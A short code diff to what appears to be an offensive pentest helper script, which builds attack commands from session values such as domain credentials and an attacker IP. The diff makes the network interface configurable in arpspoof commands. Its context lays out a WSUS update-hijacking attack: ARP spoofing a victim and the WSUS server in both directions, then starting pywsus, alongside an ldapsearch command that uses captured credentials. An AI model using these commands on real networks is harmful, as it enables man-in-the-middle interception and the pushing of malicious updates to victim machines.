@@ -25,6 +25,7 @@ def run():
     user    = input_or_session("username",      "Username")
     pw      = input_or_session("password",      "Password")
     attacker = input_or_session("attacker_ip", "Attacker IP")
+    iface = SESSION.get("attacker_iface") or "<INTERFACE>"
 
     base_dn = "DC=" + dom.replace(".", ",DC=")
     ldap_b  = f"ldapsearch -x -H ldaps://{dc}:636 -D '{user}@{dom}' -w '{pw}' -b '{base_dn}'"
@@ -75,8 +76,8 @@ def run():
 
   ── Step 1: ARP spoof victim → WSUS ──────────────────────────────────────
   # Identify victim IP and WSUS IP from registry/GPO
-  arpspoof -i tun0 -t <VICTIM_IP> <WSUS_IP>
-  arpspoof -i tun0 -t <WSUS_IP> <VICTIM_IP>
+  arpspoof -i {iface} -t <VICTIM_IP> <WSUS_IP>
+  arpspoof -i {iface} -t <WSUS_IP> <VICTIM_IP>
 
   ── Step 2: Start pywsus ─────────────────────────────────────────────────
   sudo python3 /opt/pywsus/pywsus.py \\
